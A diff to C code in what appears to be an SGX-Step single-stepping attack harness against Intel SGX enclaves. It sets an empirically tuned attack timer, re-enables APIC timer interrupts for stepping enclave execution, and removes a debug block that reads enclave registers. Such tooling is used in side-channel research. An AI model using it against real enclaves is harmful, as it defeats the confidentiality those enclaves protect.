@@ -161,7 +161,7 @@ unsigned long long __aex_count = 0;
 
 
 const uint64_t attack_timer_range = 1; 
-const uint64_t attack_timer_base_time = 100000000; 
+const uint64_t attack_timer_base_time = 2300; // tested empirically. 
 
 void aep_cb_func(void)
 {
@@ -180,25 +180,9 @@ void aep_cb_func(void)
     else if (__sgx_step_apic_triggered == STEP_PHASE_2 && (__ss_irq_count > 0) && (!__sgx_step_app_terminated)){
         // uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();
         // printf("[[ sgx-step ]] ^^ enclave RIP=%#lx ^^\n", erip);    
-        // __aex_count += 1; 
-        // apic_timer_irq(SGX_STEP_INTERVAL);
+        __aex_count += 1; 
+        apic_timer_irq(SGX_STEP_INTERVAL);
     }
-
-
-
-    uint64_t cval; 
-    gprsgx_region_t gprsgx; 
-    edbgrd(get_enclave_ssa_gprsgx_adrs(), &gprsgx, sizeof(gprsgx_region_t)); 
-    cval = gprsgx.fields.r14;  
-    if (cval == 0xFEFEFEFE && __sgx_step_apic_triggered == STEP_PHASE_2){
-        uint64_t tmict, tmcct; 
-        apic_read_timer_count(&tmict, &tmcct); 
-        printf(" ====> [[ DEBUG ]] cval = %lx, irq_cnt = %d | apic_tmict = %lx, apic_tmcct = %lx \n", cval, __ss_irq_count, tmict, tmcct); 
-    }else{  
-        // printf(" ====> [[ DEBUG ]] cval = %lx\n", cval);
-    }
-
-
 }
 
 // 0x 1111 1111 1111 1111 1111 1111 1111 1111 
